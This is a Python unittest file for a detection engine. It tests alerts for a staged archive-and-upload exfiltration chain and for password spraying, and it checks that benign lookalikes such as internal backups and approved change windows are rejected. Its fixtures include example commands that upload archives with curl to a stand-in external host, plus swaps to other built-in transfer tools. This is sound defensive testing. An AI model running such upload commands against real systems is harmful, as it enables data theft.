import json
import random
import unittest
from helpers import chain_rows, iso, load, net, proc
from chronotrace import detect


def run(files, **kw):
    ev, *_ = load(files)
    return detect.detect_all(ev, **kw), ev


class ChainTests(unittest.TestCase):
    def test_canonical_chain_alerts_critical(self):
        v, _ = run({"e.jsonl": chain_rows()})
        self.assertEqual([(x["rule"], x["status"], x["severity"]) for x in v],
                         [("staging_exfil_chain", "ALERT", "critical")])

    def test_lolbin_swaps_still_alert(self):
        for office, script, arch, xfer in [("EXCEL.EXE", "pwsh.exe", "7z.exe", "wget.exe"),
                                           ("outlook.exe", "wscript.exe", "zip.exe", "bitsadmin.exe"),
                                           ("POWERPNT.EXE", "cmd.exe", "rar.exe", "curl.exe")]:
            with self.subTest(office=office, script=script, arch=arch, xfer=xfer):
                v, _ = run({"e.jsonl": chain_rows(office, script, arch, xfer)})
                self.assertEqual([x["rule"] for x in v if x["status"] == "ALERT"], ["staging_exfil_chain"])

    def test_office_spawning_browser_does_not_alert(self):
        v, _ = run({"e.jsonl": [proc(0, "chrome.exe", "OUTLOOK.EXE"), proc(1, "chrome.exe", "OUTLOOK.EXE")]})
        self.assertEqual(v, [])

    def test_missing_stage_means_no_chain(self):
        rows = [r for r in chain_rows() if "tar" not in r["image"]]
        v, _ = run({"e.jsonl": rows})
        self.assertEqual([x for x in v if x["rule"] == "staging_exfil_chain"], [])

    def test_chain_outside_window_does_not_alert(self):
        rows = chain_rows()
        rows[3] = proc(500, "curl.exe", "powershell.exe", cmd="curl.exe -T a https://drop.example.invalid/u")
        v, _ = run({"e.jsonl": rows})
        self.assertEqual([x for x in v if x["rule"] == "staging_exfil_chain"], [])

    def test_confidence_reflects_independent_sources(self):
        v1, _ = run({"e.jsonl": chain_rows()})
        self.assertEqual(v1[0]["confidence"], "medium")
        v2, _ = run({"e.jsonl": chain_rows(), "n.jsonl": [net(7, "drop.example.invalid", corr="X1")]})
        self.assertEqual((v2[0]["confidence"], v2[0]["independent_sources"]), ("high", 2))

    def test_input_order_does_not_change_verdicts(self):
        ev, *_ = load({"e.jsonl": chain_rows()})
        a = json.dumps(detect.detect_all(ev), sort_keys=True)
        random.Random(1).shuffle(ev)
        self.assertEqual(a, json.dumps(detect.detect_all(ev), sort_keys=True))


class LookalikeTests(unittest.TestCase):
    def backup(self, dst="backup.corp.internal", parent="C:\\Backup\\backupagent.exe"):
        return [proc(0, "tar.exe", parent, host="S1"),
                proc(20, "curl.exe", parent, host="S1", cmd=f"curl.exe -T n.zip https://{dst}/up")]

    def test_internal_service_backup_is_rejected_with_reasons(self):
        v, _ = run({"e.jsonl": self.backup()})
        self.assertEqual((v[0]["status"], len(v[0]["reasons"])), ("REJECTED_BENIGN", 2))

    def test_same_archive_to_external_destination_alerts(self):
        v, _ = run({"e.jsonl": self.backup(dst="drop.example.invalid")})
        self.assertEqual(v[0]["status"], "ALERT")

    def test_user_launched_internal_archive_is_not_auto_rejected(self):
        v, _ = run({"e.jsonl": self.backup(parent="C:\\Windows\\explorer.exe")})
        self.assertEqual(v[0]["status"], "ALERT")

    def test_approved_change_covers_external_transfer_only_inside_window(self):
        chg = [{"change_id": "CHG-1", "status": "APPROVED", "host": "S1",
                "starts_at": iso(-10), "ends_at": iso(60)}]
        v, _ = run({"e.jsonl": self.backup(dst="drop.example.invalid", parent="explorer.exe")}, changes=chg)
        self.assertEqual(v[0]["status"], "REJECTED_BENIGN")
        chg[0]["ends_at"] = iso(10)  # window ends mid-activity
        v, _ = run({"e.jsonl": self.backup(dst="drop.example.invalid", parent="explorer.exe")}, changes=chg)
        self.assertEqual(v[0]["status"], "ALERT")
        chg[0]["ends_at"], chg[0]["status"] = iso(60), "PENDING"
        v, _ = run({"e.jsonl": self.backup(dst="drop.example.invalid", parent="explorer.exe")}, changes=chg)
        self.assertEqual(v[0]["status"], "ALERT")

    def test_time_only_change_record_cannot_whitelist_everything(self):
        chg = [{"change_id": "CHG-2", "status": "APPROVED", "starts_at": iso(-10), "ends_at": iso(60)}]
        v, _ = run({"e.jsonl": self.backup(dst="drop.example.invalid", parent="explorer.exe")}, changes=chg)
        self.assertEqual(v[0]["status"], "ALERT")

    def test_documentation_range_ips_are_external(self):
        self.assertFalse(detect.is_internal("198.51.100.7"))
        self.assertTrue(detect.is_internal("10.1.2.3"))
        self.assertTrue(detect.is_internal("db.corp.internal"))
        self.assertFalse(detect.is_internal("files.example.invalid"))


class AuthTests(unittest.TestCase):
    def burst(self, ip="198.51.100.9", n=10, step=300, success=True):
        rows = [{"timestamp": iso(i * step), "user": f"u{i % 4}", "src_ip": ip, "event": "login_failed"}
                for i in range(n)]
        if success:
            rows.append({"timestamp": iso(n * step + 600), "user": "u1", "src_ip": ip, "event": "login_success"})
        return rows

    def test_slow_spray_then_success_is_high(self):
        v, _ = run({"a.jsonl": self.burst()})
        self.assertEqual((v[0]["status"], v[0]["severity"], v[0]["facts"]["followed_by_success"]),
                         ("ALERT", "high", True))

    def test_below_threshold_is_quiet(self):
        v, _ = run({"a.jsonl": self.burst(n=5)})
        self.assertEqual(v, [])

    def test_approved_scanner_rejected_but_same_burst_without_change_alerts(self):
        chg = [{"change_id": "CHG-S", "status": "APPROVED", "src_ip": "198.51.100.9",
                "starts_at": iso(-60), "ends_at": iso(7200)}]
        v, _ = run({"a.jsonl": self.burst(success=False)}, changes=chg)
        self.assertEqual(v[0]["status"], "REJECTED_BENIGN")
        v, _ = run({"a.jsonl": self.burst(success=False)})
        self.assertEqual((v[0]["status"], v[0]["severity"]), ("ALERT", "medium"))

    def test_success_after_approved_window_breaks_the_exemption(self):
        chg = [{"change_id": "CHG-S", "status": "APPROVED", "src_ip": "198.51.100.9",
                "starts_at": iso(-60), "ends_at": iso(2900)}]
        v, _ = run({"a.jsonl": self.burst()}, changes=chg)
        self.assertEqual(v[0]["status"], "ALERT")


if __name__ == "__main__":
    unittest.main()
